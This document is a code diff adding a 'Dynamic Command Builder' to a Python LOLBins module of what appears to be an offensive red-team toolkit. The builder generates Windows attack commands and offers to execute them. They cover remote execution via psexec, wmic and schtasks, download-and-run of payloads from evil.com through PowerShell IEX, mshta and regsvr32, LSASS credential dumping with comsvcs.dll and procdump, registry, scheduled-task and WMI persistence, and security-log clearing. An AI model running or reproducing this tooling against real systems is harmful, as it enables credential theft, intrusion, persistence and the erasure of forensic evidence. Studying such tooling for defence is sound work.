@@ -7,6 +7,7 @@ LOLBins organized by function and MITRE ATT&CK techniques.
 Reference: https://github.com/sheimo/awesome-lolbins-and-beyond
 """
 
+import base64
 from typing import Dict, List, Any, Optional
 from rich.console import Console
 from rich.panel import Panel
@@ -515,12 +516,13 @@ class LOLBinsModule:
             table.add_row("7", "Persistence LOLBins")
             table.add_row("8", "Defense Evasion LOLBins")
             table.add_row("9", "Collection LOLBins")
+            table.add_row("10", "Build Command Dynamically")
             table.add_row("0", "Return to main menu")
             
             console.print(table)
             console.print()
             
-            choice = Prompt.ask("Select function", choices=['0', '1', '2', '3', '4', '5', '6', '7', '8', '9'], default='0')
+            choice = Prompt.ask("Select function", choices=['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '10'], default='0')
             
             if choice == '0':
                 break
@@ -542,6 +544,8 @@ class LOLBinsModule:
                 self._show_category(console, 'Defense Evasion')
             elif choice == '9':
                 self._show_category(console, 'Collection')
+            elif choice == '10':
+                self._build_command(console, session_data)
             
             console.print()
     
@@ -615,3 +619,605 @@ class LOLBinsModule:
             for i, example in enumerate(info['examples'], 1):
                 console.print(f"  {i}. [cyan]{example}[/cyan]")
             console.print()
+    
+    def _build_command(self, console: Console, session_data: dict):
+        """Build command dynamically based on use case"""
+        console.print("\n[bold cyan]Dynamic Command Builder[/bold cyan]\n")
+        
+        # Show use cases
+        use_cases = {
+            '1': ('Execute Code Remotely', 'lateral'),
+            '2': ('Execute Code Locally', 'execution'),
+            '3': ('Dump Credentials', 'credential'),
+            '4': ('Discover Network/Systems', 'discovery'),
+            '5': ('Establish Persistence', 'persistence'),
+            '6': ('Download File', 'evasion'),
+            '7': ('Clear Logs', 'evasion'),
+            '8': ('Copy Files', 'collection')
+        }
+        
+        table = Table(title="Use Cases", box=box.ROUNDED)
+        table.add_column("Option", style="cyan")
+        table.add_column("Use Case", style="white")
+        table.add_column("Category", style="dim white")
+        
+        for key, (use_case, category) in use_cases.items():
+            table.add_row(key, use_case, category)
+        
+        console.print(table)
+        console.print()
+        
+        use_case_choice = Prompt.ask("Select use case", choices=list(use_cases.keys()))
+        use_case_name, category = use_cases[use_case_choice]
+        
+        console.print(f"\n[bold]Building command for: {use_case_name}[/bold]\n")
+        
+        # Route to appropriate builder
+        if category == 'lateral':
+            self._build_lateral_command(console, session_data)
+        elif category == 'execution':
+            self._build_execution_command(console, session_data)
+        elif category == 'credential':
+            self._build_credential_command(console, session_data)
+        elif category == 'discovery':
+            self._build_discovery_command(console, session_data)
+        elif category == 'persistence':
+            self._build_persistence_command(console, session_data)
+        elif category == 'evasion':
+            self._build_evasion_command(console, session_data, use_case_name)
+        elif category == 'collection':
+            self._build_collection_command(console, session_data)
+    
+    def _build_lateral_command(self, console: Console, session_data: dict):
+        """Build lateral movement command"""
+        console.print("[bold]Lateral Movement Command Builder[/bold]\n")
+        
+        method = Prompt.ask(
+            "Method",
+            choices=['psexec', 'sc', 'wmic', 'winrs', 'schtasks'],
+            default='wmic'
+        )
+        
+        target = Prompt.ask("Target hostname or IP")
+        
+        # Validate target if LAB_USE=1
+        lab_use = session_data.get('LAB_USE', 0)
+        if lab_use == 1:
+            from modules.utils import validate_target
+            valid, error = validate_target(target, lab_use)
+            if not valid:
+                console.print(f"[red]{error}[/red]")
+                return
+        
+        command = Prompt.ask("Command to execute", default="whoami")
+        
+        if method == 'psexec':
+            username = Prompt.ask("Username (optional)", default="")
+            password = Prompt.ask("Password (optional)", default="", password=True)
+            
+            if username and password:
+                cmd = f'psexec.exe \\\\{target} -u {username} -p {password} {command}'
+            elif username:
+                cmd = f'psexec.exe \\\\{target} -u {username} {command}'
+            else:
+                cmd = f'psexec.exe \\\\{target} {command}'
+            
+            if Confirm.ask("Run as SYSTEM?", default=False):
+                cmd = cmd.replace('psexec.exe', 'psexec.exe -s')
+        
+        elif method == 'sc':
+            service_name = Prompt.ask("Service name", default="TestService")
+            action = Prompt.ask("Action", choices=['create', 'start', 'stop', 'delete'], default='create')
+            
+            if action == 'create':
+                cmd = f'sc \\\\{target} create {service_name} binPath= "{command}"'
+            elif action == 'start':
+                cmd = f'sc \\\\{target} start {service_name}'
+            elif action == 'stop':
+                cmd = f'sc \\\\{target} stop {service_name}'
+            else:
+                cmd = f'sc \\\\{target} delete {service_name}'
+        
+        elif method == 'wmic':
+            username = Prompt.ask("Username (optional)", default="")
+            password = Prompt.ask("Password (optional)", default="", password=True)
+            
+            if username and password:
+                cmd = f'wmic /node:{target} /user:{username} /password:{password} process call create "{command}"'
+            else:
+                cmd = f'wmic /node:{target} process call create "{command}"'
+        
+        elif method == 'winrs':
+            username = Prompt.ask("Username (optional)", default="")
+            password = Prompt.ask("Password (optional)", default="", password=True)
+            
+            if username and password:
+                cmd = f'winrs -r:{target} -u:{username} -p:{password} {command}'
+            else:
+                cmd = f'winrs -r:{target} {command}'
+        
+        elif method == 'schtasks':
+            task_name = Prompt.ask("Task name", default="UpdateTask")
+            username = Prompt.ask("Username (optional)", default="")
+            password = Prompt.ask("Password (optional)", default="", password=True)
+            schedule = Prompt.ask("Schedule", choices=['onstart', 'onlogon', 'daily', 'once'], default='onstart')
+            
+            auth_part = ""
+            if username and password:
+                auth_part = f' /u {username} /p {password}'
+            
+            cmd = f'schtasks /create /s {target}{auth_part} /tn {task_name} /tr "{command}" /sc {schedule}'
+            
+            if Confirm.ask("Run task immediately?", default=False):
+                run_cmd = f'schtasks /run /s {target}{auth_part} /tn {task_name}'
+                console.print(f"\n[green]Created task command:[/green] {cmd}")
+                console.print(f"[green]Run task command:[/green] {run_cmd}")
+                cmd = f"{cmd}\n{run_cmd}"
+        
+        self._display_generated_command(console, cmd, method, session_data)
+    
+    def _build_execution_command(self, console: Console, session_data: dict):
+        """Build local execution command"""
+        console.print("[bold]Local Execution Command Builder[/bold]\n")
+        
+        method = Prompt.ask(
+            "Execution method",
+            choices=['powershell', 'cmd', 'mshta', 'rundll32', 'regsvr32', 'wmic', 'cscript'],
+            default='powershell'
+        )
+        
+        if method == 'powershell':
+            execution_type = Prompt.ask(
+                "Execution type",
+                choices=['command', 'file', 'encoded', 'download'],
+                default='command'
+            )
+            
+            if execution_type == 'command':
+                ps_cmd = Prompt.ask("PowerShell command", default="Get-Process")
+                cmd = f'powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "{ps_cmd}"'
+            
+            elif execution_type == 'file':
+                script_path = Prompt.ask("Script path", default="script.ps1")
+                cmd = f'powershell.exe -NoProfile -ExecutionPolicy Bypass -File "{script_path}"'
+            
+            elif execution_type == 'encoded':
+                ps_cmd = Prompt.ask("PowerShell command", default="Get-Process")
+                encoded = base64.b64encode(ps_cmd.encode('utf-16-le')).decode('ascii')
+                cmd = f'powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand {encoded}'
+                console.print(f"[dim]Base64 encoded: {encoded}[/dim]\n")
+            
+            elif execution_type == 'download':
+                url = Prompt.ask("Script URL", default="http://evil.com/script.ps1")
+                cmd = f'powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "IEX(New-Object Net.WebClient).DownloadString(\'{url}\')"'
+        
+        elif method == 'cmd':
+            cmd_text = Prompt.ask("Command", default="whoami")
+            cmd = f'cmd.exe /c {cmd_text}'
+        
+        elif method == 'mshta':
+            hta_type = Prompt.ask("HTA source", choices=['url', 'file', 'javascript'], default='url')
+            
+            if hta_type == 'url':
+                url = Prompt.ask("HTA URL", default="http://evil.com/payload.hta")
+                cmd = f'mshta.exe {url}'
+            elif hta_type == 'file':
+                file_path = Prompt.ask("HTA file path", default="payload.hta")
+                cmd = f'mshta.exe {file_path}'
+            else:
+                js_code = Prompt.ask("JavaScript code", default='alert("XSS")')
+                cmd = f'mshta.exe javascript:{js_code}'
+        
+        elif method == 'rundll32':
+            dll = Prompt.ask("DLL", default="shell32.dll")
+            function = Prompt.ask("Function", default="ShellExec_RunDLL")
+            argument = Prompt.ask("Argument", default="calc.exe")
+            cmd = f'rundll32.exe {dll},{function} {argument}'
+        
+        elif method == 'regsvr32':
+            url = Prompt.ask("SCT file URL", default="http://evil.com/file.sct")
+            cmd = f'regsvr32.exe /s /n /u /i:{url} scrobj.dll'
+        
+        elif method == 'wmic':
+            command = Prompt.ask("Command to execute", default="calc.exe")
+            cmd = f'wmic process call create "{command}"'
+        
+        elif method == 'cscript':
+            script_path = Prompt.ask("Script path", default="script.vbs")
+            cmd = f'cscript.exe {script_path}'
+        
+        self._display_generated_command(console, cmd, method, session_data)
+    
+    def _build_credential_command(self, console: Console, session_data: dict):
+        """Build credential access command"""
+        console.print("[bold]Credential Access Command Builder[/bold]\n")
+        
+        method = Prompt.ask(
+            "Method",
+            choices=['rundll32_lsass', 'procdump', 'taskmgr', 'vaultcmd', 'cmdkey'],
+            default='rundll32_lsass'
+        )
+        
+        if method == 'rundll32_lsass':
+            pid = Prompt.ask("LSASS PID (optional, leave empty to find)", default="")
+            dump_file = Prompt.ask("Dump file path", default="lsass.dmp")
+            
+            if not pid:
+                console.print("[yellow]Finding LSASS PID...[/yellow]")
+                cmd = f'rundll32.exe C:\\Windows\\System32\\comsvcs.dll MiniDump <PID> {dump_file} full'
+                console.print("[dim]Note: Replace <PID> with actual LSASS PID[/dim]")
+            else:
+                cmd = f'rundll32.exe C:\\Windows\\System32\\comsvcs.dll MiniDump {pid} {dump_file} full'
+        
+        elif method == 'procdump':
+            pid = Prompt.ask("LSASS PID (optional)", default="")
+            dump_file = Prompt.ask("Dump file path", default="lsass.dmp")
+            
+            if pid:
+                cmd = f'procdump.exe -accepteula -ma {pid} {dump_file}'
+            else:
+                cmd = f'procdump.exe -accepteula -ma lsass.exe {dump_file}'
+        
+        elif method == 'taskmgr':
+            console.print("[yellow]Manual process:[/yellow]")
+            console.print("1. Open Task Manager")
+            console.print("2. Right-click lsass.exe")
+            console.print("3. Select 'Create dump file'")
+            cmd = "[Manual] Task Manager → lsass.exe → Create dump file"
+        
+        elif method == 'vaultcmd':
+            vault_type = Prompt.ask("Vault type", choices=['list', 'credentials'], default='list')
+            
+            if vault_type == 'list':
+                cmd = 'vaultcmd /list'
+            else:
+                vault_name = Prompt.ask("Vault name", default="Windows Credentials")
+                cmd = f'vaultcmd /listcreds:"{vault_name}"'
+        
+        elif method == 'cmdkey':
+            action = Prompt.ask("Action", choices=['list', 'add'], default='list')
+            
+            if action == 'list':
+                cmd = 'cmdkey /list'
+            else:
+                target = Prompt.ask("Target", default="target:445")
+                username = Prompt.ask("Username", default="user")
+                password = Prompt.ask("Password", default="", password=True)
+                cmd = f'cmdkey /add:{target} /user:{username} /pass:{password}'
+        
+        self._display_generated_command(console, cmd, method, session_data)
+    
+    def _build_discovery_command(self, console: Console, session_data: dict):
+        """Build discovery command"""
+        console.print("[bold]Discovery Command Builder[/bold]\n")
+        
+        method = Prompt.ask(
+            "Discovery type",
+            choices=['network', 'accounts', 'system', 'sessions', 'shares', 'domain'],
+            default='network'
+        )
+        
+        if method == 'network':
+            tool = Prompt.ask("Tool", choices=['net', 'arp', 'ipconfig', 'nslookup'], default='net')
+            
+            if tool == 'net':
+                scope = Prompt.ask("Scope", choices=['domain', 'target', 'local'], default='domain')
+                
+                if scope == 'domain':
+                    cmd = 'net view /domain'
+                elif scope == 'target':
+                    target = Prompt.ask("Target hostname", default="server")
+                    cmd = f'net view \\\\{target}'
+                else:
+                    cmd = 'net view'
+            
+            elif tool == 'arp':
+                cmd = 'arp -a'
+            
+            elif tool == 'ipconfig':
+                detail = Prompt.ask("Detail level", choices=['basic', 'all', 'dns'], default='all')
+                
+                if detail == 'all':
+                    cmd = 'ipconfig /all'
+                elif detail == 'dns':
+                    cmd = 'ipconfig /displaydns'
+                else:
+                    cmd = 'ipconfig'
+            
+            elif tool == 'nslookup':
+                target = Prompt.ask("DNS target", default="example.com")
+                record_type = Prompt.ask("Record type", choices=['A', 'MX', 'NS', 'ANY'], default='A')
+                cmd = f'nslookup -type={record_type} {target}'
+        
+        elif method == 'accounts':
+            tool = Prompt.ask("Tool", choices=['net', 'whoami'], default='net')
+            
+            if tool == 'net':
+                scope = Prompt.ask("Scope", choices=['local', 'domain', 'groups'], default='local')
+                
+                if scope == 'local':
+                    cmd = 'net user'
+                elif scope == 'domain':
+                    cmd = 'net group /domain'
+                else:
+                    group = Prompt.ask("Group name", default="Domain Admins")
+                    cmd = f'net group "{group}" /domain'
+            
+            else:
+                detail = Prompt.ask("Detail level", choices=['basic', 'all', 'groups', 'priv'], default='all')
+                
+                if detail == 'all':
+                    cmd = 'whoami /all'
+                elif detail == 'groups':
+                    cmd = 'whoami /groups'
+                elif detail == 'priv':
+                    cmd = 'whoami /priv'
+                else:
+                    cmd = 'whoami'
+        
+        elif method == 'system':
+            tool = Prompt.ask("Tool", choices=['systeminfo', 'wmic'], default='systeminfo')
+            
+            if tool == 'systeminfo':
+                target = Prompt.ask("Target (optional)", default="")
+                if target:
+                    cmd = f'systeminfo /s {target}'
+                else:
+                    cmd = 'systeminfo'
+            else:
+                query = Prompt.ask("WMI query", choices=['os', 'processes', 'services', 'software'], default='os')
+                
+                if query == 'os':
+                    cmd = 'wmic os get name,version'
+                elif query == 'processes':
+                    cmd = 'wmic process list'
+                elif query == 'services':
+                    cmd = 'wmic service list'
+                else:
+                    cmd = 'wmic product get name,version'
+        
+        elif method == 'sessions':
+            tool = Prompt.ask("Tool", choices=['quser', 'qwinsta'], default='quser')
+            target = Prompt.ask("Target (optional)", default="")
+            
+            if tool == 'quser':
+                if target:
+                    cmd = f'quser /server:{target}'
+                else:
+                    cmd = 'quser'
+            else:
+                if target:
+                    cmd = f'qwinsta /server:{target}'
+                else:
+                    cmd = 'qwinsta'
+        
+        elif method == 'shares':
+            target = Prompt.ask("Target (optional)", default="")
+            if target:
+                cmd = f'net view \\\\{target}'
+            else:
+                cmd = 'net share'
+        
+        elif method == 'domain':
+            tool = Prompt.ask("Tool", choices=['net', 'nltest'], default='net')
+            
+            if tool == 'net':
+                cmd = 'net view /domain'
+            else:
+                action = Prompt.ask("Action", choices=['dclist', 'trusts', 'dc'], default='dclist')
+                
+                if action == 'dclist':
+                    domain = Prompt.ask("Domain (optional)", default="")
+                    if domain:
+                        cmd = f'nltest /dclist:{domain}'
+                    else:
+                        cmd = 'nltest /dclist'
+                elif action == 'trusts':
+                    cmd = 'nltest /domain_trusts'
+                else:
+                    domain = Prompt.ask("Domain", default="example.com")
+                    cmd = f'nltest /dsgetdc:{domain}'
+        
+        self._display_generated_command(console, cmd, method, session_data)
+    
+    def _build_persistence_command(self, console: Console, session_data: dict):
+        """Build persistence command"""
+        console.print("[bold]Persistence Command Builder[/bold]\n")
+        
+        method = Prompt.ask(
+            "Persistence method",
+            choices=['schtasks', 'sc', 'reg', 'wmi'],
+            default='schtasks'
+        )
+        
+        if method == 'schtasks':
+            task_name = Prompt.ask("Task name", default="UpdateTask")
+            command = Prompt.ask("Command to execute", default="powershell.exe -File script.ps1")
+            schedule = Prompt.ask("Schedule", choices=['onlogon', 'onstart', 'daily', 'hourly'], default='onlogon')
+            user = Prompt.ask("Run as user", choices=['SYSTEM', 'CurrentUser', 'Custom'], default='SYSTEM')
+            
+            if user == 'SYSTEM':
+                user_part = ' /ru SYSTEM'
+            elif user == 'CurrentUser':
+                user_part = ''
+            else:
+                custom_user = Prompt.ask("Custom username", default="")
+                user_part = f' /ru {custom_user}'
+            
+            cmd = f'schtasks /create /tn {task_name} /tr "{command}" /sc {schedule}{user_part}'
+            
+            if Confirm.ask("Run task immediately?", default=False):
+                run_cmd = f'schtasks /run /tn {task_name}'
+                cmd = f"{cmd}\n{run_cmd}"
+        
+        elif method == 'sc':
+            service_name = Prompt.ask("Service name", default="UpdateService")
+            command = Prompt.ask("Command to execute", default="C:\\Windows\\System32\\svchost.exe -k netsvcs")
+            start_type = Prompt.ask("Start type", choices=['auto', 'demand', 'disabled'], default='auto')
+            
+            cmd = f'sc create {service_name} binPath= "{command}" start= {start_type}'
+            
+            if Confirm.ask("Start service?", default=False):
+                start_cmd = f'sc start {service_name}'
+                cmd = f"{cmd}\n{start_cmd}"
+        
+        elif method == 'reg':
+            location = Prompt.ask("Registry location", choices=['HKCU_Run', 'HKLM_Run', 'HKCU_Startup'], default='HKCU_Run')
+            key_name = Prompt.ask("Key name", default="Update")
+            command = Prompt.ask("Command to execute", default="powershell.exe -File script.ps1")
+            
+            if location == 'HKCU_Run':
+                reg_path = 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run'
+            elif location == 'HKLM_Run':
+                reg_path = 'HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run'
+            else:
+                reg_path = 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run'
+            
+            cmd = f'reg add {reg_path} /v {key_name} /t REG_SZ /d "{command}" /f'
+        
+        elif method == 'wmi':
+            filter_name = Prompt.ask("Event filter name", default="UpdateFilter")
+            consumer_name = Prompt.ask("Event consumer name", default="UpdateConsumer")
+            command = Prompt.ask("Command to execute", default="calc.exe")
+            
+            console.print("[yellow]WMI Event Subscription (simplified):[/yellow]")
+            cmd = f'''wmic /namespace:\\\\root\\subscription PATH __EventFilter Create Name="{filter_name}", EventNameSpace="root\\cimv2", QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfRawData_PerfOS_System'"
+wmic /namespace:\\\\root\\subscription PATH CommandLineEventConsumer Create Name="{consumer_name}", ExecutablePath="{command}"
+wmic /namespace:\\\\root\\subscription PATH __FilterToConsumerBinding Create Filter="__EventFilter.Name=\\"{filter_name}\\"", Consumer="CommandLineEventConsumer.Name=\\"{consumer_name}\\""'''
+        
+        self._display_generated_command(console, cmd, method, session_data)
+    
+    def _build_evasion_command(self, console: Console, session_data: dict, use_case: str):
+        """Build defense evasion command"""
+        console.print(f"[bold]Defense Evasion Command Builder - {use_case}[/bold]\n")
+        
+        if 'Download' in use_case:
+            method = Prompt.ask(
+                "Download method",
+                choices=['certutil', 'bitsadmin', 'curl', 'powershell'],
+                default='certutil'
+            )
+            
+            url = Prompt.ask("File URL", default="http://evil.com/file.exe")
+            output = Prompt.ask("Output path", default="file.exe")
+            
+            if method == 'certutil':
+                cmd = f'certutil.exe -urlcache -split -f {url} {output}'
+            elif method == 'bitsadmin':
+                job_name = Prompt.ask("BITS job name", default="UpdateJob")
+                cmd = f'bitsadmin /transfer {job_name} {url} {output}'
+            elif method == 'curl':
+                cmd = f'curl.exe {url} -o {output}'
+            else:
+                cmd = f'powershell.exe -Command "(New-Object Net.WebClient).DownloadFile(\'{url}\', \'{output}\')"'
+        
+        elif 'Clear' in use_case:
+            log_type = Prompt.ask("Log type", choices=['Security', 'System', 'Application', 'All'], default='Security')
+            
+            if log_type == 'All':
+                cmd = 'wevtutil.exe cl Security\nwevtutil.exe cl System\nwevtutil.exe cl Application'
+            else:
+                cmd = f'wevtutil.exe cl {log_type}'
+        
+        else:
+            method = Prompt.ask("Evasion method", choices=['certutil_encode', 'findstr'], default='certutil_encode')
+            
+            if method == 'certutil_encode':
+                file_path = Prompt.ask("File to encode", default="file.exe")
+                encoded_file = Prompt.ask("Encoded output", default="file.b64")
+                cmd = f'certutil.exe -encode {file_path} {encoded_file}'
+            else:
+                search_term = Prompt.ask("Search term", default="password")
+                search_path = Prompt.ask("Search path", default="C:\\Users\\*.txt")
+                cmd = f'findstr /s /i "{search_term}" {search_path}'
+        
+        self._display_generated_command(console, cmd, method, session_data)
+    
+    def _build_collection_command(self, console: Console, session_data: dict):
+        """Build collection/exfiltration command"""
+        console.print("[bold]Collection Command Builder[/bold]\n")
+        
+        method = Prompt.ask(
+            "Copy method",
+            choices=['robocopy', 'xcopy', 'copy'],
+            default='robocopy'
+        )
+        
+        source = Prompt.ask("Source path", default="C:\\Users\\user\\Documents")
+        destination = Prompt.ask("Destination", default="\\\\target\\share\\docs")
+        
+        if method == 'robocopy':
+            options = []
+            if Confirm.ask("Mirror (delete destination files not in source)?", default=False):
+                options.append('/MIR')
+            if Confirm.ask("Copy subdirectories?", default=True):
+                options.append('/E')
+            if Confirm.ask("Copy all file info?", default=False):
+                options.append('/COPYALL')
+            
+            opts_str = ' ' + ' '.join(options) if options else ''
+            cmd = f'robocopy "{source}" "{destination}"{opts_str}'
+        
+        elif method == 'xcopy':
+            options = []
+            if Confirm.ask("Copy subdirectories?", default=True):
+                options.append('/E')
+            if Confirm.ask("Include empty directories?", default=False):
+                options.append('/I')
+            if Confirm.ask("Suppress prompts?", default=True):
+                options.append('/Y')
+            
+            opts_str = ' ' + ' '.join(options) if options else ''
+            cmd = f'xcopy "{source}" "{destination}"{opts_str}'
+        
+        else:
+            if Confirm.ask("Copy all files (*.*)?", default=True):
+                source = source.rstrip('\\') + '\\*.*'
+            cmd = f'copy "{source}" "{destination}"'
+        
+        self._display_generated_command(console, cmd, method, session_data)
+    
+    def _display_generated_command(self, console: Console, cmd: str, method: str, session_data: dict):
+        """Display generated command with options"""
+        console.print(f"\n[bold green]Generated Command:[/bold green]\n")
+        
+        # Show command in a panel
+        from rich.panel import Panel
+        console.print(Panel(cmd, title=f"{method.upper()} Command", border_style="green"))
+        
+        console.print()
+        
+        # Show options
+        options = []
+        
+        if Confirm.ask("[bold]Copy command?[/bold]", default=False):
+            # Show command for manual copy
+            console.print("\n[bold]Command to copy:[/bold]")
+            console.print(Panel(cmd, border_style="cyan"))
+            console.print("[dim]Command displayed above - copy manually[/dim]")
+        
+        if Confirm.ask("[bold]Execute command?[/bold]", default=False):
+            lab_use = session_data.get('LAB_USE', 0)
+            from modules.utils import execute_cmd, execute_powershell
+            
+            # Determine if PowerShell or CMD
+            if 'powershell' in cmd.lower():
+                exit_code, stdout, stderr = execute_powershell(cmd, lab_use=lab_use)
+            else:
+                exit_code, stdout, stderr = execute_cmd(cmd, lab_use=lab_use)
+            
+            console.print(f"\n[bold]Execution Result:[/bold]")
+            console.print(f"Exit Code: {exit_code}")
+            if stdout:
+                console.print(f"\n[green]Output:[/green]\n{stdout}")
+            if stderr:
+                console.print(f"\n[red]Error:[/red]\n{stderr}")
+        
+        if Confirm.ask("[bold]Save to file?[/bold]", default=False):
+            filename = Prompt.ask("Filename", default="command.txt")
+            try:
+                with open(filename, 'w') as f:
+                    f.write(cmd)
+                console.print(f"[green]Command saved to {filename}[/green]")
+            except Exception as e:
+                console.print(f"[red]Error saving: {e}[/red]")
